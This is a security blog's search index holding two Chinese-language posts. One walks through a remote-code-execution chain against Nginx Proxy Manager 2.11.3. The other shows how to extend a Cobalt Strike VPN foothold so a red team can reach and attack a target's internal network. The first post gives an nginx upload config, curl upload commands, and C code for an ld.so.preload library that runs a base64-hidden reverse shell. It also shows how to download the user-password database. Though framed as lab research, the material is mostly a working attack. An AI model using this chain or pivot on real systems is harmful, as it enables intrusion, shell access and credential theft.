<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Nginx Proxy Manager v2.11.3 RCE</title>
    <link href="/SecLabBlog/2024/08/26/nginx_proxy_manager_rce/"/>
    <url>/SecLabBlog/2024/08/26/nginx_proxy_manager_rce/</url>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>该漏洞<strong>并非</strong>是 NPM 项目的代码存在漏洞，而是 NPM Docker 环境的默认配置存在缺陷，在 NPM 用户拥有 <code>Hosts</code> 的 <code>Manage</code> 权限的情况下，可以获取<strong>容器内</strong>的 Shell 。</p><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>Nginx Proxy Manager (NPM) 基于 Ubuntu + Nginx 容器化部署。</p><p>创建一个空目录，创建 <code>docker-compose.yml</code> 文件，内容：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3.8&#x27;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">app:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">&#x27;jc21/nginx-proxy-manager:2.11.3&#x27;</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;80:80&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;81:81&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;443:443&#x27;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./data:/data</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./letsencrypt:/etc/letsencrypt</span><br></code></pre></td></tr></table></figure><p>在该目录下执行以下命令，以启动容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker compose up -d<br><span class="hljs-comment"># docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>访问 <a href="http://localhost:81/login">http://localhost:81/login</a> 以进行操作。</p><p>初始用户密码：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Email:</span>    admin@example.com<br><span class="hljs-symbol">Password:</span> changeme<br></code></pre></td></tr></table></figure><p>具体细节参考： <a href="https://nginxproxymanager.com/guide/#quick-setup">quick-setup</a></p><p>用户登录后可以设置反向代理、重定向等功能。</p><p><img src="/SecLabBlog/images/npm_rce/image-0.png"></p><p>这些功能基本上都是基于修改 <code>nginx.conf</code> 文件实现的，因此以下的内容本质上都是 <code>nginx.conf</code> 配置安全漏洞，只不过由于该项目允许用户在前端编辑和加载配置文件而能够被利用。</p><p>当然了，搞来搞去也就是在容器里而已，没啥意思，管好用户权限就行了。</p><h1 id="从文件写入到-RCE"><a href="#从文件写入到-RCE" class="headerlink" title="从文件写入到 RCE"></a>从文件写入到 RCE</h1><h2 id="允许-PUT-方式上传"><a href="#允许-PUT-方式上传" class="headerlink" title="允许 PUT 方式上传"></a>允许 PUT 方式上传</h2><p>首先新建一个 <code>Proxy Host</code>：</p><p><img src="/SecLabBlog/images/npm_rce/image-9.png"></p><p>图中 <code>Domain Names</code> 可以写该反代服务器的 IP 或域名，总之能够通过这个地址访问到这个容器里的反代端口即可，我们假设为 <code>npm.example.com</code>。其余字段随便写应该都不影响。</p><p>然后通过高级设置，自定义 <code>nginx.conf</code> 配置文件以允许 <code>PUT</code> 方式上传。</p><p><img src="/SecLabBlog/images/npm_rce/image-1.png"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">location /gupload/ &#123;<br>dav_methods PUT;<br>alias /etc/;<br>limit_except PUT &#123;<br>deny all;<br>&#125;<br>client_max_body_size 100M;<br>dav_access user:rw;<br>autoindex on;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们可以通过向 URL <code>http://npm.example.com/gupload/filename</code> 发送 <code>PUT</code> 请求来将文件上传到 <code>/etc/</code> 目录，上传后的文件名应该为 <code>filename</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X PUT -d <span class="hljs-string">&quot;1&quot;</span> http://npm.example.com/gupload/1.txt<br></code></pre></td></tr></table></figure><p>可以看到文件能够被上传到容器内：</p><p><img src="/SecLabBlog/images/npm_rce/image-2.png"></p><h2 id="关于-ld-so-preload-劫持"><a href="#关于-ld-so-preload-劫持" class="headerlink" title="关于 ld.so.preload 劫持"></a>关于 ld.so.preload 劫持</h2><p>理论上我可以通过 <code>写 SSH 私钥</code>、<code>写 Crontab</code> 的方式来实现命令执行，但是为什么要用 <code>ld.so.preload</code> 方式呢？</p><p>首先，这是个容器环境，没有 ssh 服务，所以写私钥没意义。</p><p>其次，这个容器基于 <code>Ubuntu</code>，尽管我们通过 <code>dav_access user:rw;</code> 指定了文件权限为 <code>0600</code>，但是这容器没开 <code>cron</code> 服务，执行不了命令。</p><p>而 <code>ld.so.preload</code> 方案则非常通用。我们不需要给上传的运行库文件设置什么权限，同时 <code>ld.so.preload</code> 文件中允许指定任意位置的 <code>so</code>。最重要的是，大部分进程在执行的时候都会预加载这个 <code>so</code>，十分甚至九分地好用。</p><h2 id="编译-Preload-so"><a href="#编译-Preload-so" class="headerlink" title="编译 Preload.so"></a>编译 Preload.so</h2><p>源码: <code>preload.c</code> 文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//preload.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> _init(<span class="hljs-type">void</span>) &#123;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>unlink(<span class="hljs-string">&quot;/etc/ld.so.preload&quot;</span>);<br>system(<span class="hljs-string">&quot;echo \&quot;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4yMi4wLjEvOTA5MCAwPiYx\&quot; | base64 -d | bash -i&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fPIC -shared -o preload.so preload.c -nostartfiles -ldl<br></code></pre></td></tr></table></figure><p><img src="/SecLabBlog/images/npm_rce/image-3.png"></p><h2 id="上传-Preload-so"><a href="#上传-Preload-so" class="headerlink" title="上传 Preload.so"></a>上传 Preload.so</h2><p>依次执行以下两个命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -T <span class="hljs-string">&quot;preload.so&quot;</span> http://npm.example.com/gupload/preload.so<br>curl -X PUT -d <span class="hljs-string">&quot;/etc/preload.so&quot;</span> http://npm.example.com/gupload/ld.so.preload<br></code></pre></td></tr></table></figure><p>执行后，<code>preload.so</code> 和 <code>ld.so.preload</code> 文件应该被会上传到 <code>/etc/</code> 路径下。</p><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>成功上传后，理论上此时执行任何二进制程序，都会导致恶意 <code>.so</code> 被执行。</p><p>开启监听端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 9090<br></code></pre></td></tr></table></figure><p>根据项目代码，在 <code>WebUI</code> 中，保存配置、禁用和启用配置会造成执行 <code>nginx</code> 命令：</p><p><img src="/SecLabBlog/images/npm_rce/image-4.png"></p><p>项目代码：</p><p><img src="/SecLabBlog/images/npm_rce/image-5.png"></p><p>所以只要禁用配置，就可以执行 <code>nginx</code> 程序，同时造成执行恶意 <code>so</code> 文件以及里面的反弹 <code>Shell</code> 命令。</p><p><img src="/SecLabBlog/images/npm_rce/image-6.png"></p><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><p>相对于 RCE，这个功能显得不是很危险。</p><p>同样的修改 <code>nginx.conf</code> 配置文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">location /ggimgs &#123; <br><span class="hljs-built_in">alias</span> /data/database.sqlite;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/SecLabBlog/images/npm_rce/image-7.png"></p><p>这样我们就可以通过访问 <code>http://npm.example.com/ggimgs</code> 来下载容器内的 <code>database.sqlite</code> 文件。</p><p>这个文件是 <code>npm</code> 的数据库，里面保存了用户密码。同理也可以下载别的文件（也没别的什么有用的文件了）。</p><p><img src="/SecLabBlog/images/npm_rce/image-8.png"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RCE</tag>
      
      <tag>漏洞</tag>
      
      <tag>Docker</tag>
      
      <tag>Nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cobalt Strike VPN 内网穿透</title>
    <link href="/SecLabBlog/2024/08/24/cobaltstrike_vpn/"/>
    <url>/SecLabBlog/2024/08/24/cobaltstrike_vpn/</url>
    
    <content type="html"><![CDATA[<h1 id="需求背景"><a href="#需求背景" class="headerlink" title="需求背景"></a>需求背景</h1><ol><li>网上没找到太多和 CS VPN 有关的文章。</li><li>在目标上部署了 CS VPN 后，只有 CS 主控（teamserver） 可以访问目标内网，异地 team 成员无法访问。</li></ol><h1 id="关于-CS-VPN"><a href="#关于-CS-VPN" class="headerlink" title="关于 CS VPN"></a>关于 CS VPN</h1><ol><li><p>CS 这个 VPN 功能很垃圾，除非必要不然别用。</p></li><li><p>VPN 部署在 UDP 等协议下，目标需要能够直接回连主控 IP，会导致暴露主控。</p></li><li><p>不想暴露主控的 IP 就设置 VPN 接口协议为 TCP(Bind) ，此时会从 Beacon 转发，但是会将 Sleep Time 设为 0，否则连接质量会很差。</p></li></ol><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p><img src="/SecLabBlog/images/cobaltstrike_vpn/0.png" alt="代理拓扑"></p><p>通过在 CS 主控服务器上部署 WireGuard VPN 服务，让 team 成员客户端接入 WG VPN 网络，并配置流量转发，以实现 team 成员访问目标内网的能力。</p><p>对于 VPN 本身的安全性和稳定性问题暂时不讨论（我也没辙）。</p><p>如果有更好的解决方案，欢迎提 issue。</p><h1 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul><li><code>CS</code> 和 <code>WG</code> 服务端装在同一云服务器上</li><li>3 台靶机组网，位于台式机上</li><li>1 台攻击机，位于笔记本电脑</li><li>攻击机和靶机环境物理隔绝</li><li>拥有某一台靶机的 <code>CS Beacon</code> 会话</li><li>在该靶机上部署了 <code>CS VPN</code></li></ul><p><img src="/SecLabBlog/images/cobaltstrike_vpn/1.png" alt="靶机情况"></p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/2.png" alt="靶机内网"></p><p>根据参考资料以及拓扑图，我们需要搭建两个 VPN 网络：</p><ul><li><code>CS 主控</code> 为核心的：<code>靶机 Beacon -&gt; CS 主控</code> VPN 网络，靶机为客户端。</li><li><code>WG 服务</code> 为核心的：<code>team 成员 -&gt; WG</code> VPN 网络，<code>team成员</code> 为客户端。</li><li><code>CS 主控</code> 和 <code>WG 服务</code> 位于同一公网云主机。</li></ul><h2 id="Cobalt-Strike-VPN-部署"><a href="#Cobalt-Strike-VPN-部署" class="headerlink" title="Cobalt Strike VPN 部署"></a>Cobalt Strike VPN 部署</h2><p>在 CS 客户端界面即可操作。</p><p>通过 CS 在目标主机部署 VPN 客户端后，还需要在 CS 主控（teamserver）上启用虚拟网卡并配置 IP 地址和网关信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 启用虚拟网卡，记住刚才创建的网卡名称，不确定就用 ip a 命令查看</span><br><span class="hljs-built_in">sudo</span> ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> phear1 up<br><span class="hljs-comment"># 设置 IP 和掩码</span><br><span class="hljs-built_in">sudo</span> ip addr add 192.168.163.211/24 dev phear1<br></code></pre></td></tr></table></figure><p>正确配置后，CS 主控（teamserver）应该能访问目标内网。</p><p>CS VPN 接口:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/3.png"></p><p>CS 主控服务器虚拟网卡:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/4.png"></p><p>CS 主控服务器路由:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/5.png"></p><p>CS 主控服务器成功通过 CS VPN 访问靶机内网其他主机:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/7.png"></p><h2 id="WireGuard-VPN-部署"><a href="#WireGuard-VPN-部署" class="headerlink" title="WireGuard VPN 部署"></a>WireGuard VPN 部署</h2><p>WG 服务端部署参考：<a href="https://yangpin.link/archives/1601.html">https://yangpin.link/archives/1601.html</a></p><p>注意：为了让 <code>WG VPN</code> 成员能够通过 <code>WG VPN</code> 服务器访问其他网段，需要开启转发</p><p>其中，我们根据实际环境要确定几个信息：</p><ul><li>WG 服务器公网监听所使用的网卡：<code>eth0</code></li><li>WG 服务器公网监听端口：<code>51820</code></li><li>WG 服务器 VPN 服务虚拟网卡：<code>wg0</code></li><li>VPN 虚拟网段：<code>10.252.1.0/24</code></li></ul><p>开启 IP 转发：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;net.ipv4.ip_forward = 1&quot;</span> &gt;&gt; /etc/sysctl.conf<br>sysctl -p<br></code></pre></td></tr></table></figure><p>开启 iptables 转发：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t nat -A POSTROUTING -s 10.252.1.0/24 -o eth0 -j MASQUERADE; iptables -A INPUT -p udp -m udp --dport 51820 -j ACCEPT; iptables -A FORWARD -i wg0 -j ACCEPT; iptables -A FORWARD -o wg0 -j ACCEPT; <br></code></pre></td></tr></table></figure><p>CS 主控服务器 iptables:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/6.png"></p><h2 id="配置-Team-成员以访问目标内网"><a href="#配置-Team-成员以访问目标内网" class="headerlink" title="配置 Team 成员以访问目标内网"></a>配置 Team 成员以访问目标内网</h2><p>先关闭 <code>team</code> 成员设备上的 <code>WG VPN</code> 客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> wg-quick down /path/to/config<br></code></pre></td></tr></table></figure><p>根据前文信息，我们目标内网为 <code>192.168.163.0/24</code>，那么可以修改 <code>team</code> 成员设备的 <code>WG VPN</code> 客户端配置文件：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">AllowedIPs = 192.168.163.0/24<br></code></pre></td></tr></table></figure><p>完整内容如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">[Interface]<br>Address = 10.252.1.1/32<br>PrivateKey = 6DhDQcQOwFOW80muHxxxxxxxxxxxxxxxxxxx<br>MTU = 1450<br><br>[Peer]<br>PublicKey = 3Nr7DWnVmRwsl+yAF7HPMxxxxxxxxxxxxxx<br>PresharedKey = 9+HxR/pQvH0Srv/6Iuzxxxxxxxxxxxxxxxx<br>AllowedIPs = 192.168.163.0/24<br>Endpoint = 1.2.3.4:51820<br>PersistentKeepalive = 15<br></code></pre></td></tr></table></figure><p>这样设置的意思是该客户端所有发往 <code>192.168.163.0/24</code> 的流量都从 VPN 隧道传输，而且不影响成员主机正常访问互联网。</p><p>而由于我们的 <code>WG 服务端</code> 和 <code>CS 主控</code> 是同一设备，<code>CS 主控</code> 可以访问目标内网，就可以让 team 成员通过 <code>WG 服务端</code> 进入目标内网。</p><p>启用 <code>team</code> 成员设备上的 <code>WG VPN</code> 客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> wg-quick up /path/to/config<br></code></pre></td></tr></table></figure><p>启用客户端后，会自动创建虚拟网卡，自动配置 ip 和路由。</p><p>team 成员 WireGuard 虚拟网卡信息:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/8.png"></p><p>team 成员 WireGuard 虚拟网卡路由:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/9.png"></p><p>team 成员通过 <code>WG VPN</code> 访问目标靶机内网：</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/10.png"></p><p>team 成员通过漏洞利用，攻击靶机内网的其他设备：</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/11.png"></p>]]></content>
    
    
    <categories>
      
      <category>C2</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cobalt Strike</tag>
      
      <tag>CS</tag>
      
      <tag>VPN</tag>
      
      <tag>内网穿透</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
